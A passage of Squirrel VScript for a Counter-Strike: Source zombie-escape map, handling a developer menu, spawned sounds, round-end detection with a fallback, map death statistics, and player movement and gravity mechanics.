else if(efi=="random"){foreach(p in ::PLAYERS){if(p.handle!=null&&p.handle.IsValid())pa.push(p.handle)}}else if(efi=="randomct")
{foreach(p in ::PLAYERS){if(p.handle!=null&&p.handle.IsValid()&&p.handle.GetTeam()==3)pa.push(p.handle)}}else if(efi=="randomt")
{foreach(p in ::PLAYERS){if(p.handle!=null&&p.handle.IsValid()&&p.handle.GetTeam()==2)pa.push(p.handle)}}else{pc=::GetPlayerClass(efi);
if(pc==null){try{pc=::GetPlayerClass(efi.tointeger());}catch(e){return;}};if(pc!=null&&pc.handle!=null&&pc.handle.IsValid())el.push(pc.handle);}
if(pa.len()>0){el.push(pa[RandomInt(0,pa.len()-1)]);};foreach(eft in el){printl("|-----> "+eft);EntFire(ts[2],ts[3],t,0.00,eft);}}}}
::pcdev_index<-0;::pcdev_menu<-null;::pcdev_menutimer<-0.00;::pcdev_menutimeset<-5.00;
::PCDEVAG<-null;::PCDEVAGAM<-30;::PCDEVA<-function(handle){if(handle==null||!handle.IsValid()||handle.IsAlive()==false)return;
if(!::IsKeyPressed(handle,"LMB"))return;local hw=::NetProps.GetPropEntity(handle,"m_hActiveWeapon");if(hw==null){}else{
if(hw.GetClassname() in ::ITEMS.heal_orb.specific_ammo) hw.SetClip1(::ITEMS.heal_orb.specific_ammo[hw.GetClassname()]);else hw.SetClip1(::PCDEVAGAM);}
if(::PCDEVAG==null||!::PCDEVAG.IsValid()){if(::round_ended)return;;::PCDEVAG = Entities.CreateByClassname("game_player_equip");
::PCDEVAG.__KeyValueFromInt("spawnflags",1);::PCDEVAG.__KeyValueFromString("weapon_hegrenade","1");};if(handle.GetTeam()==2&&handle.GetHealth()>1002){}else{
local gff=false;local c=handle.FirstMoveChild();while(c!=null){if(c.GetClassname()=="weapon_hegrenade"){gff=true;break;};c=c.NextMovePeer();};
if(!gff)EntFireByHandle(::PCDEVAG,"Use","",0.00,handle,null);}};;::pcdevtext<-null;::pcdevtext_channel<-2;function _PLAYERCLASSDEVSETUP(){
::pcdevtext = Entities.CreateByClassname("game_text");::pcdevtext.__KeyValueFromInt("channel",::pcdevtext_channel);
::pcdevtext.__KeyValueFromInt("spawnflags",0);::pcdevtext.__KeyValueFromInt("effect",0);::pcdevtext.__KeyValueFromFloat("x",-1);
::pcdevtext.__KeyValueFromFloat("y",0.10);::pcdevtext.__KeyValueFromVector("color",Vector(255,200,0));::pcdevtext.__KeyValueFromFloat("fadein",0.00);
::pcdevtext.__KeyValueFromFloat("fadeout",0.00);::pcdevtext.__KeyValueFromFloat("holdtime",5.25);
::Ent(Vector(),Vector(),"logic_relay",{targetname="shiftld"},{function Think(){if(::DEVID!=null){local p = GetPlayerFromUserID(::DEVID);
if(p!=null&&p.IsValid()&&p.IsAlive()){p.ValidateScriptScope();if(!("__dsh" in p.GetScriptScope()))p.GetScriptScope().__dsh<-null;
if(p.GetScriptScope().__dsh==null||!p.GetScriptScope().__dsh.IsValid())::_dlistener(p);}}return 1.00;},function Run(){AddThinkToEnt(self,"Think");}});
::_dlistener<-function(dd){::ShiftListener(dd,{function EventFired(name,data){if(::DEVID==null)return;local pc = ::GetPlayerClass(data.userid);
if(pc==null)return;if(pc.userid!=::DEVID)return;if(pc.handle==null||!pc.handle.IsValid()||pc.handle.IsAlive()==false)return;
if(data.ctrl){::pcdev_menutimer=0.00;::pcdev_menu=null;::pcdev_index=0;::pcdevtext.__KeyValueFromString("message","");
EntFireByHandle(::pcdevtext,"Display","",0.00,pc.handle,null);return;}
::EyeTrace(pc.handle,{player=pc.handle,function Run(player,dir,rot){if(dir.z >= 0.950){local z=player.GetVelocity().z+350;if(z<350)z=350;else if(z>1000)z=1000;
local xyv = player.GetVelocity();xyv.z=0.00;player.SetVelocity(Vector(0,0,z)+(player.GetForwardVector()*(xyv.Length()+100)));}else if(dir.z <= -0.995){local pcdevxact="";
local pcdfirst=false;if(::pcdev_menu==null){::pcdev_menu=::DEVMENU;pcdfirst=true;};if(::pcdev_menu==null||::pcdev_menu.len()<=0)return;
if(!pcdfirst){if((typeof ::pcdev_menu[::pcdev_index].Act)=="array"){::pcdev_menu=::pcdev_menu[::pcdev_index].Act;::pcdev_index=0;}
else{::pcdev_menu[::pcdev_index].Act(player);pcdevxact="[X] ";};};::pcdev_menutimer=(0.00+::pcdev_menutimeset);
::pcdevtext.__KeyValueFromString("message",pcdevxact+::pcdev_menu[::pcdev_index].name);EntFireByHandle(::pcdevtext,"Display","",0.00,player,null);}
else{::PCDEVA(player);if(::pcdev_menu==null)::pcdev_menu=::DEVMENU;if(::pcdev_menu==null||::pcdev_menu.len()<=0)return;if(::pcdev_menutimer<=0.00)return;
if(dir.z <= 0.00){::pcdev_index++;if(::pcdev_index>::pcdev_menu.len()-1)::pcdev_index=0;}
else{::pcdev_index--;if(::pcdev_index<0)::pcdev_index=(::pcdev_menu.len()-1);};::pcdev_menutimer = (0.00+::pcdev_menutimeset);
::pcdevtext.__KeyValueFromString("message",::pcdev_menu[::pcdev_index].name);EntFireByHandle(::pcdevtext,"Display","",0.00,player,null);}}});}});}
}EntFireByHandle(::manager,"RunScriptCode","_PLAYERCLASSDEVSETUP();",0.10,null,null);
function _PLAYERCLASSDEVSETUPT(){EntFireByHandle(self,"RunScriptCode","_PLAYERCLASSDEVSETUPT();",0.10,null,null);
::pcdev_menutimer-=(0.10+((ceil(0.10/FrameTime()))*FrameTime()-0.10));if(::pcdev_menutimer<=0.00){::pcdev_menutimer=0.00;::pcdev_menu=null;::pcdev_index=0;}}
EntFireByHandle(::manager,"RunScriptCode","_PLAYERCLASSDEVSETUPT();",0.10,null,null);
::EventListener("player_say",{function EventFired(event,data){::EFCHAT(data.userid,data.text);}});
::sound_nameidx <- 0;
::sound_clientcmd <- null;
::Sound<-function(sound,pos=Vector(),_parent=null,radius=10000,lifetime=0.05,pitch=100,volume=10,logic=null)
{
	if(radius<0)
	{
		if(_parent==null||!_parent.IsValid()||_parent.GetClassname()!="player")return;
		if(::sound_clientcmd==null)::sound_clientcmd = Entities.CreateByClassname("point_clientcommand");
		EntFireByHandle(::sound_clientcmd,"Command","play "+sound,0.00,_parent,null);
		return null;
	}
	::sound_nameidx++;
	if(::sound_nameidx>1000)::sound_nameidx=1;
	local mname = "soundmaster_"+::sound_nameidx.tostring();
	local globalsound = false;
	if(radius==0)globalsound = true;
	//::manager.PrecacheModel("models/props_combine/combinebutton.mdl");
	::Ent(pos,Vector(),"prop_dynamic",{
			model = "models/props_combine/combinebutton.mdl",
			StartDisabled = 0,
			rendermode = 1,
			renderamt = 0,
			solid = 0,
		},{
		pos=pos,
		_parent=_parent,
		radius=radius,
		lifetime=lifetime,
		pitch=pitch,
		volume=volume,
		sound=sound,
		mname=mname,
		globalsound = globalsound,
		killnow=false,
		soundhandle=null,
		logic=logic,
		function Tick(){
			if(killnow)
			{
				EntFireByHandle(self,"Kill","",0.00,null,null);
				if(soundhandle==null||!soundhandle.IsValid()){}else EntFireByHandle(soundhandle,"Kill","",0.00,null,null);
				return;
			}
			EntFireByHandle(self,"RunScriptCode"," Tick(); ",0.05,null,null);
			if(soundhandle==null||!soundhandle.IsValid()){killnow=true;return;}
			if(_parent==null||!_parent.IsValid()){}else self.SetOrigin(_parent.GetOrigin()+
			(_parent.GetForwardVector()*pos.x)+
			(_parent.GetLeftVector()*pos.y)+
			(_parent.GetUpVector()*pos.z));
		},function Run(){
			self.__KeyValueFromString("targetname",mname);
			if(lifetime==null||lifetime<=0.00){}else EntFireByHandle(self,"RunScriptCode"," killnow=true; ",lifetime,null,null);
			PrecacheSound(sound);
			local flags = 48;
			if(radius == 0)flags++;
			local kvs = {
				spawnflags = flags,
				volume = volume,
				pitch = pitch,
				radius = radius,
				message = sound,
			};
			if(!globalsound)kvs.SourceEntityName <- ""+mname;	//NEW IN V1_9 - this prevents borked stuff with music plugins (thanks to Tilgep for finding the root cause)
			if(logic==null)logic={};
			logic.parenthandle <- self;
			logic.lifetime <- lifetime;
			logic.pitch <- pitch;
			logic.volume <- volume;
			logic.globalsound <- globalsound;
			::Ent(Vector(),Vector(),"ambient_generic",kvs,{
				sparent=self,
				lifetime=lifetime,
				pitch=pitch,
				volume=volume,
				logic=logic,
				function Run(){
					EntFireByHandle(self,"PlaySound","",0.00,null,null);
					EntFireByHandle(self,"Volume",volume.tostring(),0.00,null,null);
					EntFireByHandle(self,"Pitch",pitch.tostring(),0.01,null,null);
					if(lifetime==null||lifetime<=0.00){}else EntFireByHandle(self,"Kill","",lifetime,null,null);
					sparent.ValidateScriptScope();
					sparent.GetScriptScope().soundhandle = self;
					EntFireByHandle(sparent,"RunScriptCode"," Tick(); ",0.00,null,null);
					if(logic!=null)
					{
						logic.soundhandle <- self;
						if("Run" in logic)logic.Run();
					}
				}});
		}});
	return mname;
}
//--------------------------------------------------------------------------------------------------------------------\\



if(!("round_end_event_is_working" in this))	//__CSS__ enable this if the server has a functional "round_end" event, not blocked by plugin hooks/whatever
::round_end_event_is_working <- true;		//__CSS__ if it's false, it will use a dirtier, spammier fallback logic to replicate "round_end"
::round_end_event_rate <- 0.20;
::_round_end_event_handle <- null;

::listenroundend_index <- 0;		//__CSS__ <<< old jank
::ListenRoundEnd<-function(logic)	//table:{function RoundEnd(winner){printl("ListenRoundEnd: "+winner+" (3:CT, 2=T, 1=DRAW, null=BUGGED)");}}
{
	
	
	//__CSS__certain CS:S plugins can block this event from running by their hooks, if it doesn't trigger - contact the server owner
	//__CSS__ now using this as a temporary workaround, until servers get their plugins fixed:
	if(!::round_end_event_is_working)
	{
		if(::_round_end_event_handle == null || !::_round_end_event_handle.IsValid())
			::_round_end_event_handle = ::Ent(Vector(),Vector(),"logic_relay",{targetname="roundend_fake_listener"},{
				ended = false,
				listeners = [],
				alive_humans = {},
				function RoundEnded(winner=0){
					if(this.ended)return;
					this.ended = true;
												//printl("XXXXXXXXXXXXXXXXXXXXXXXXXXXX  --- ROUND ENDED --- winner: "+winner.tostring());
					foreach(listener in listeners)
					{
												//printl("      xxxxxxxxxxxx   win-listener: "+listener.tostring());
						try{
							listener.RoundEnd(winner,{winner=winner,reason=0,message="fakelistener"});
						}catch(e){printl("::ListenRoundEnd - fakelistener ERROR: "+e);}
					}
				},
				function Think(){
					if(::GetPlayerCount()<=1)return 2.00;	//don't run this when running around alone/offline
					if(this.ended)return 5.00;
					local alive_ct = 0;
					local alive_t = 0;
					local a_team_is_dead = false;
					for(local h;h=Entities.FindByClassname(h,"player");){
						if(h==null||!h.IsValid())continue;
						if(h.GetTeam()==3&&h.IsAlive())alive_ct++;
						else if(h.GetTeam()==2&&h.IsAlive())alive_t++;
						local edx = h.entindex();
						if(!(edx in this.alive_humans))
							this.alive_humans[edx] <- h;
					}
					if(alive_ct==0 || alive_t==0)
						a_team_is_dead = true;
					if(alive_ct==0 && alive_t==0)
						RoundEnded(0);	//no winners, draw
					else if(a_team_is_dead && !::MOTHER_ZOMBIE_SPAWNED)
					{
								//NOPE - this insta ends shit because servers may spawn everyone as a CT...
						//RoundEnded(0);	//something happened early on, default to a draw for safety
					}
					else
					{
						local cleanup = [];
						foreach(i,h in this.alive_humans)
						{
							if(h==null||!h.IsValid())
							{
								cleanup.push(i);
								continue;
							}
							if(!::MOTHER_ZOMBIE_SPAWNED)
								continue;
							if(h.GetTeam()!=3||!h.IsAlive())
								cleanup.push(i);
						}
						foreach(cidx in cleanup)
							delete this.alive_humans[cidx];
						if(::MOTHER_ZOMBIE_SPAWNED)
						{
							if(alive_t==0&&this.alive_humans.len()>0)
								RoundEnded(3);	//humans won
							else if(this.alive_humans.len()==0)
								RoundEnded(2);	//zombies won
						}
					}
					return ::round_end_event_rate;
				},
				function Run(){
					EntFireByHandle(self,"RunScriptCode","AddThinkToEnt(self,\"Think\");",2.00,null,null);
				}});
		::_round_end_event_handle.GetScriptScope().listeners.push(logic);
	}
	else
	{
		//__CSS__ new jank
		::EventListener("round_end",{
			_logic = logic,
			function EventFired(event,data)
			{
				this._logic.RoundEnd(data.winner,data);
			}
		});
	}
	
	
	
	
		//__CSS__ old jank, new above^
	//::listenroundend_index++;
	//local ii=(0+::listenroundend_index);
	//::Ent(Vector(),Vector(),"logic_eventlistener",{EventName="round_end",FetchEventData="1",targetname="eventlistener_roundend"+ii.tostring(),},{
	//	logic = logic,
	//	ii=ii,
	//	function RunEvent(){
	//		local winner = null;
	//		try{winner=event_data.winner;}catch(e){}
	//		logic.RoundEnd(winner);
	//	},function Run(){
	//		EntFireByHandle(self,"AddOutput","OnEventFired eventlistener_roundend"+ii.tostring()+":RunScriptCode:RunEvent();:0:-1",0.00,null,null);
	//	}});
}
function PreNewRoundStart()
{
	printl("PreNewRoundStart() ---- CLEANING ENTS SHORTLY BEFORE NEWROUND-START");
	EntFire("block_*","Kill","",0.00,null);
	//EntFire("nutent_*","Kill","",0.00,null);	//__CSS__ nutent removed/code baked into this, can hotspawn everything now
	EntFire("kart","RunScriptCode","Clean();",0.00,null);
	EntFire("i_*","Kill","",0.00,null);
	EntFire("hitbox*","Kill","",0.00,null);
	EntFire("boss*","Kill","",0.00,null);
	EntFire("game_player_equip","Kill","",0.00,null);
	EntFire("player","AddOutput","movetype 0",0.00,null);		//__CSS__ since this may be called instantly, freeze everyone
		//EntFire("item_*","Kill","",0.00,null);	//OLD in v1_6 - moved to '_ListenRoundEnd()' in v1_7
	DisableTPdestIndicator();
}
function ListenPreNewRoundStart()
{
	
	//__CSS__ replacement event, unfortunately not 100% foolproof (mp_restartgame won't trigger, and "game commencing" will trigger instantly)
	::ListenRoundEnd({
			function RoundEnd(winner,data){
				local time = 0.00;
				if(data.message=="#CTs_Win"||data.message=="#Terrorists_Win"||data.message=="#Round_Draw")
					try{time = Convars.GetFloat("mp_round_restart_delay") - 0.05;}catch(e){}
				if(time < 0.00)time = 0.00;
				EntFire("manager","RunScriptCode"," PreNewRoundStart(); ",time,null);
			}
		});
		//__CSS__ use the same, singular ::ListenRoundEnd function instead^
	//////::EventListener("round_end",{
	//////	function EventFired(event,data)
	//////	{
	//////		local time = 0.00;
	//////		if(data.message=="#CTs_Win"||data.message=="#Terrorists_Win"||data.message=="#Round_Draw")
	//////			try{time = Convars.GetFloat("mp_round_restart_delay") - 0.05;}catch(e){}
	//////		if(time < 0.00)time = 0.00;
	//////		EntFire("manager","RunScriptCode"," PreNewRoundStart(); ",time,null);
	//////	}
	//////});
	
	
	
	
	//__CSS__ old/non-existent csgo event:
	/*
	::Ent(Vector(),Vector(),"logic_eventlistener",{EventName="cs_pre_restart",FetchEventData="1",targetname="eventlistener_roundprenewstart",},{
		ran = false,
		function RunEvent(){
			if(ran)return;
			ran = true;
			EntFire("manager","RunScriptCode"," PreNewRoundStart(); ",0.00,null);
		},function Run(){
			EntFireByHandle(self,"AddOutput","OnEventFired eventlistener_roundprenewstart:RunScriptCode:RunEvent();:0:-1",0.00,null,null);
		}});
	*/
}
EntFire("manager","RunScriptCode"," ListenPreNewRoundStart(); ",6.00,null);
::round_ended <- false;
function _ListenRoundEnd()
{
	try{
	::ListenRoundEnd({
			function RoundEnd(winner,data){
				::round_ended = true;
				::manager.GetScriptScope().RoundEndStat();
				EntFire("manager","RunScriptCode"," RoundEndMessagePost(); ",0.10,null);
				EntFire("piggyback_saddle","RunScriptCode","locked=true;GetOff(); ",0.00,null);
				try{::manager.GetScriptScope().PrintMapDeathSummary();}catch(e){}
					//NEW in v1_7 - killing off item-related stuff to prevent teamkilling on wins:
						EntFire("item_*","Kill","",0.00,null);
						EntFire("i_claymore","Kill","",0.00,null);
						EntFire("i_planetcrystal_wind","Kill","",0.00,null);
			}
		});
	}catch(e){printl("_ListenRoundEnd ERROR: " + e);}
}
roundendstat_done <- false;
function RoundEndStat()
{
	if(roundendstat_done)return;
	roundendstat_done = true;
	try{
		if(::stage > 5)::stats_rstat[5]++;
		else ::stats_rstat[::stage]++;
	}catch(e){printl("RoundEndStat ERROR: "+e);}
}
function RoundEndMessagePost()
{
	if(::round_already_won)return;		//don't print a message if people won, leave that for the relevant ending
	if(::ending_called)return;			//don't print a message if an ending has been triggered, leave that for the relevant ending
	local reached_level = 0+::manager.GetScriptScope().mapspawnindex;
	local message = "\x07FF3F3F[ROUND END] \x04";
	if(::stage==null)
		message=message+"resetting map!";
	else if(::stage >= ::STAGES.len())
	{
		if(::stage == ::STAGES.len() || ::finale_checkout_checked)
		{
			local fd = "finale";
			if(::finale_checkout_checked)fd = "infinite-finale(checkout:"+(0+::finale_checkout_mapspawnindex).tostring()+")";
			if(!::finale_endrun_started)
			{
				local bosshandle = Entities.FindByName(null,"boss_eye_hitbox");
				if(bosshandle==null||!bosshandle.IsValid())message=message+"you lost during the early "+fd;
				else
				{
					local boss_hp = 0;
					local bosses_found = 0;
					for(local h;h=Entities.FindByName(h,"boss_eye_hitbox");)
					{
						if(h==null||!h.IsValid())continue;
						bosses_found++;
						boss_hp += (h.GetHealth()-::HITBOX_ZERO_HP);
					}
					local boss_grenades_hit = (0+::finale_boss_statp_nadecount);
					local boss_maxhp = (0+::finale_boss_statp_maxhp);
					local hp_perc = ((fabs((0.00+boss_hp)/(0.00+boss_maxhp)))*100);
					hp_perc = hp_perc.tointeger();
					message=message+"you lost during the "+fd+" bossfight ("+hp_perc.tostring()+"% out of "+boss_maxhp.tostring()+"hp left | "+boss_grenades_hit.tostring()+" grenades hit)";
				}
			}
			else
				message=message+"you lost during the "+fd+" ending-rush (level "+reached_level.tostring()+"/"+::finale_escape_levelamount.tostring()+")";
		}
		else
			message=message+"you reached level "+reached_level.tostring()+"/infinity";
	}
	else 
		message=message+"you reached level "+reached_level+"/"+::STAGES[::stage].stage_goal.tostring()+"";
	message = message + " (SID:"+::SESSION_ID+")";
	::ServerSay("say "+message,0.00,null);
	printl(message);
}
EntFire("manager","RunScriptCode"," _ListenRoundEnd(); ",5.00,null);

death_summary_print <- true;
function PrintMapDeathSummary()
{
	if(!death_summary_print)
	{
		printl("PrintMapDeathSummary() - 'death_summary_print' is false - aborting!");
		return;
	}
	printl("-----------------------------------------------------------------------------------------------------------------------");
	printl("[MAP DEATH SUMMARY]");
	if(mapspawnindex<=0)printl("     'mapspawnindex' is 0");
	else
	{
		local sum = "ID_DEATHS|";
		for(local i=(0+mapspawnindex);i>0;i--)
		{
			printl(		"     index: "+i+
						"   |   deaths: "+::MAPDATA[i].deaths+
						"   |   id: "+::MAPDATA[i].id+
						"   |   name: "+::MAPDATA[i].name+
						"   |   author: "+::MAPDATA[i].author
						);
			local id = ""+::MAPDATA[i].id;
			id = id.slice(1,id.len());
			local sid = ::SESSION_ID.slice(1,::SESSION_ID.len()-1);
			::SendDataToWeb(::SERVER_IP,"ZE_COLLECTIVE_MAPSTAT","sid,"+sid+",mapid,"+id.tostring()+
					",deaths,"+::MAPDATA[i].deaths.tostring()+
					",mapindex,"+mapspawnindex.tostring()+
					",rounds,"+::rounds_played.tostring()+
					",stage,"+::stage.tostring()
				);
			sum=sum+id+"_"+::MAPDATA[i].deaths+"|";
		}
		if(::GetPlayerCount()<=1)printl("     'playercount' is <= 1 - no chat printout");
		else ::ServerSay("say "+sum,0.00,null);
	}
	printl("-----------------------------------------------------------------------------------------------------------------------");
}

::AngleDifference<-function(start,target)
{
	local retvec = Vector();
	while(start.x<0){start.x+=360;}while(start.x>360){start.x-=360;}
	while(start.y<0){start.y+=360;}while(start.y>360){start.y-=360;}
	while(start.z<0){start.z+=360;}while(start.z>360){start.z-=360;}
	while(target.x<0){target.x+=360;}while(target.x>360){target.x-=360;}
	while(target.y<0){target.y+=360;}while(target.y>360){target.y-=360;}
	while(target.z<0){target.z+=360;}while(target.z>360){target.z-=360;}
	retvec.x=((((start.x-target.x+360)%360)-180));if(retvec.x<0)retvec.x=(-180-retvec.x);else retvec.x=(180-retvec.x);
	retvec.y=((((start.y-target.y+360)%360)-180));if(retvec.y<0)retvec.y=(-180-retvec.y);else retvec.y=(180-retvec.y);
	retvec.z=((((start.z-target.z+360)%360)-180));if(retvec.z<0)retvec.z=(-180-retvec.z);else retvec.z=(180-retvec.z);
	return retvec;
}
::Fling <- function(pos,radius=500,force=500,force_dist=true,dir=null,zmin=251,zmax=251,teams=3,attacker=null)		//teams 2:T 3:CT 1:BOTH
{
	for(local h;h=Entities.FindByClassnameWithin(h,"player",pos,radius);)
	{
		if(h==null||!h.IsValid()||h.IsAlive()==false)continue;
		if(teams!=1 && h.GetTeam()!=teams)continue;
		local ddir = null;
		if(dir==null)ddir = h.GetOrigin()-pos;
		else ddir = ::AnglesToDir(dir);
		ddir.z = 0.00;
		ddir.Norm();
		if(force_dist)
		{
			local dist = ::GetDistance(h.GetOrigin(),pos);
			local dforce = (radius-dist);
			if(dforce <= 0.00)dforce = 0.00;
			if(force < 0.00)
				dforce *= -1;
			force = (0.00+dforce);
		}
		local vel = (ddir*force);
		if(vel.z < zmin)vel.z = (0+zmin);
		else if(vel.z > zmax)vel.z = (0+zmax);
		h.SetVelocity(vel);
		::NullifyFalldownCheckpoint(h,attacker);		//NEW IN V1_7 - clears floor-checkpoint
	}
}
function ItemFallCleanup()
{
	EntFireByHandle(self,"RunScriptCode"," ItemFallCleanup(); ",::ITEMFALL_CLEANUP_RATE,null,null);
	for(local h;h=Entities.FindByName(h,"item_*");)
	{
		if(h==null||!h.IsValid()||h.GetOrigin().z > -13000)continue;
		EntFireByHandle(h,"Kill","",0.00,null,null);
	}
}
function TouchBlockSpawnTrig()
{
	if(activator==null || !activator.IsValid())return;
	if(activator.IsAlive()==false)return;
	if(activator.GetTeam()==3)
	{
		try
		{
			local md = ::MAPDATA[mapspawnindex-1];
			local ptp_pos = md.end_pos-(md.direction_next*(GRID_SIZE/2))+Vector(0,0,16);
			if(::GetDistance(activator.GetOrigin(),ptp_pos) > ::touchbspawnsafe_maxdist)
				EntFireByHandle(activator,"SetHealth","-1",0.00,null,null);
			else
			{
				activator.SetOrigin(ptp_pos);
				activator.SetVelocity(Vector());
				activator.SetForwardVector(md.direction_next);
			}
		}catch(e){EntFireByHandle(activator,"SetHealth","-1",0.00,null,null);}
	}
	else if(activator.GetTeam()==2)
	{
		activator.SetOrigin(Vector(0,0,-16160));
		activator.SetVelocity(Vector());
	}
}
function FallDownTouchTrigger()		//activator = CT playerhandle who fell into the falldown-trigger (the one that follows the stage-spawning)
{
	local toucher = activator;
	if(toucher.IsAlive()==false)return;
	local should_kill = false;
	if(!falldowncheckpoint_enabled)should_kill = true;
	else
	{
		toucher.ValidateScriptScope();
		if(!("falldowncp" in toucher.GetScriptScope()))toucher.GetScriptScope().falldowncp <- null;
		if(toucher.GetScriptScope().falldowncp==null||!toucher.GetScriptScope().falldowncp.IsValid())
			should_kill = true;
		else
		{
			local newhp = (toucher.GetHealth()-falldowncheckpoint_damage);
			if(newhp<=0)
				should_kill = true;
			else
			{
				toucher.SetVelocity(Vector());
				toucher.SetOrigin(toucher.GetScriptScope().falldowncp.GetOrigin()+Vector(0,0,30));
				EntFireByHandle(toucher,"SetHealth",newhp.tostring(),0.00,null,null);
			}
		}
	}
	if(should_kill)
	{
		if(!("falldowncp_attackers" in toucher.GetScriptScope()))toucher.GetScriptScope().falldowncp_attackers <- [];
		if(toucher.GetScriptScope().falldowncp_attackers.len()<=0)
			::HurtPlayer(toucher,true);
		else
		{
			if(toucher.GetScriptScope().falldowncp_attackers[0]==null||!toucher.GetScriptScope().falldowncp_attackers[0].IsValid())
				::HurtPlayer(toucher,true);
			else
				::HurtPlayer(toucher,999999,toucher.GetOrigin()+Vector(0,0,300),RandomInt(300,400),toucher.GetScriptScope().falldowncp_attackers[0],"falldown");
		}
		EntFireByHandle(toucher,"RunScriptCode","::HurtPlayer(self,true);",0.05,null,null);
	}
}


//__CSS__ removed model		(use the non-"nohitbox" variants instead)
//::playerillusion_forcemodel_ct <- "models/player/custom_player/luffaren/playercheap_ct_nohitbox.mdl";	//null: v1_8/old behavior that runs with player-model, else string:modelname
//::playerillusion_forcemodel_t <- "models/player/custom_player/luffaren/playercheap_t_nohitbox.mdl";		//null: v1_8/old behavior that runs with player-model, else string:modelname

::playerillusion_forcemodel_ct <- null;		//__CSS__ why not use players actual models?
::playerillusion_forcemodel_t <- null;		//__CSS__ why not use players actual models?

::playerillusion_blacklist <- [];																		//fill this with model-names to reject from being used as an illusion
::SpawnPlayerIllusion <- function(player,amount=10,offset=20)
{
	if(player==null||!player.IsValid()||player.IsAlive()==false)return;
	local ppos = player.GetOrigin()+Vector(0,0,15);
	local pmodel = player.GetModelName();
	if(player.GetTeam()==3 && ::playerillusion_forcemodel_ct != null)pmodel = ""+::playerillusion_forcemodel_ct;
	else if(player.GetTeam()==2 && ::playerillusion_forcemodel_t != null)pmodel = ""+::playerillusion_forcemodel_t;
	foreach(blm in ::playerillusion_blacklist){if(blm==pmodel)return;}		//blacklisted, abort!
	//::manager.PrecacheModel(pmodel);
	for(local i=0;i<amount;i++)
	{
		local prot = player.GetAngles()+Vector(0,RandomFloat(-offset,offset),0);
		::Ent(ppos,prot,"hegrenade_projectile",{
				rendermode = 1,
				renderamt = 255,
			},{
			pmodel = pmodel,
			function Run(){
				self.SetSize(Vector(-10,-10,0),Vector(10,10,10));
				self.SetCollisionGroup(1);
				self.SetSolid(3);
				self.SetModel(pmodel);
				EntFireByHandle(self,"AddOutput","material 3",0.00,null,null);
				EntFireByHandle(self,"AddOutput","friction 0",0.00,null,null);
				EntFireByHandle(self,"RunScriptCode","self.SetCollisionGroup(1);",0.00,null,null);
				EntFireByHandle(self,"AddOutput","movetype 3",0.02,null,null);
				EntFireByHandle(self,"RunScriptCode",
					"self.SetVelocity((::AnglesToDir(self.GetAngles())*RandomFloat(200,300))+Vector(0,0,RandomFloat(150,300)));",
					0.03,null,null);
				//EntFireByHandle(self,"AddOutput","mins -10 -10 0",0.00,null,null);
				//EntFireByHandle(self,"AddOutput","maxs 10 10 10",0.00,null,null);
				local ii = RandomFloat(2.50,3.00);
				for(local alpha=255;alpha>0;alpha-=20)
				{
					EntFireByHandle(self,"AddOutput","renderamt "+alpha.tostring(),ii,null,null);
					ii += 0.02;
				}
				EntFireByHandle(self,"Kill","",ii,null,null);
			}});
	}
}
::ValidateGravity<-function(player,roundstart=false)
{
	if(player==null||!player.IsValid())return null;
	player.ValidateScriptScope();
	local sc = player.GetScriptScope();
	if(!("gravdata" in sc) || roundstart)sc.gravdata<-{lowgrav=0,airslide=0,airslide_trig=null};
	return sc;
}
	//new in v1_5 - failsafe tick/checker to ensure that players don't keep their lowgrav outside of lowgrav-triggers, could break balance heavily...
::lowgrav_failsafe_attempt <- true;				//could set to 'false' if this fucks up, and it'll revert to how it was on v1_4 and before
::lowgrav_failsafe_airslide_trig_dist <- 100;
::lowgrav_failsafe_ptickrate <- 0.01;
::lowgrav_failsafe_ptick <- [];
function LowGravFailsafeTick()
{
	if(!::lowgrav_failsafe_attempt)return;
	local tick_called = false;
	try{
		if(::lowgrav_failsafe_ptick.len()<=0)
		{
			for(local h;h=Entities.FindByClassname(h,"player");)
			{
				if(h==null||!h.IsValid())continue;
				::lowgrav_failsafe_ptick.push(h);
			}
			if(::lowgrav_failsafe_ptick.len()<=0)
			{
				tick_called = true;
				EntFireByHandle(self,"RunScriptCode"," LowGravFailsafeTick(); ",5.00,null,null);
				return;
			}
		}
		tick_called = true;
		EntFireByHandle(self,"RunScriptCode"," LowGravFailsafeTick(); ",::lowgrav_failsafe_ptickrate,null,null);
		local player = ::lowgrav_failsafe_ptick[0];
		::lowgrav_failsafe_ptick.remove(0);
		if(player==null||!player.IsValid()||player.IsAlive()==false)return;
		player.ValidateScriptScope();
		::ValidateGravity(player);
		::ValidateGravityFinal(player,player.GetScriptScope(),null,null,true);	
	}catch(e){printl("[LowGravFailsafeTick() ERROR]: "+e);}
	if(!tick_called)EntFireByHandle(self,"RunScriptCode"," LowGravFailsafeTick(); ",0.10,null,null);
}
EntFireByHandle(::manager,"RunScriptCode"," LowGravFailsafeTick(); ",5.00,null,null);
::ValidateGravityFinal<-function(player,sc,start_end=null,lowgravtrigger=null,failsafecheck=false)
{
	if(player==null||!player.IsValid())return;
	if(sc==null)return;
	if(!("lowgravtriggers" in sc))sc.lowgravtriggers <- [];
	local lgravevent_invalid = false;	//NEW IN v1_9 - ensure removal of lowgrav if infected
	if(::lowgrav_failsafe_attempt)//new in v1_5
	{
		if(start_end!=null)
		{
			if(start_end)
			{
				local exists = false;
				foreach(trigger in sc.lowgravtriggers)
				{
					if(trigger == lowgravtrigger)
					{
						exists = true;
						break;
					}
				}
				if(!exists)
					sc.lowgravtriggers.push(lowgravtrigger);
			}
			else
			{
				for(local i=0;i<sc.lowgravtriggers.len();i++)
				{
					if(sc.lowgravtriggers[i]==lowgravtrigger)
					{
						sc.lowgravtriggers.remove(i);
						break;
					}
				}
			}
		}
		if(sc.gravdata.lowgrav>0 && !::EVENTS.LOWGRAV.active)
		{
			local touching_trigger = false;
			local lip = 30;
			local po = player.GetOrigin();
			local tos = (0+::LOWGRAV_TRIGGER_WIDTH)+lip;
			foreach(trigger in sc.lowgravtriggers)
			{
				if(trigger==null||!trigger.IsValid())continue;
				local tot = trigger.GetOrigin();
				local tob = trigger.GetOrigin()+Vector(0,0,-(30*35));
				if(	po.z >= tob.z &&
					po.z <= tot.z &&
					po.x <= (tot.x+tos) &&
					po.x >= (tot.x-tos) &&
					po.y <= (tot.y+tos) &&
					po.y >= (tot.y-tos))
					{
						touching_trigger = true;
						break;
					}
				//DebugDrawBox(tot,Vector(-2,-2,-2),Vector(2,2,2),255,0,255,255,0.03);
				//DebugDrawBox(tob,Vector(-2,-2,-2),Vector(2,2,2),255,0,255,255,0.03);
				//DebugDrawBox(tot+Vector(tos,0,0),Vector(-2,-2,-2),Vector(2,2,2),255,0,255,255,0.03);
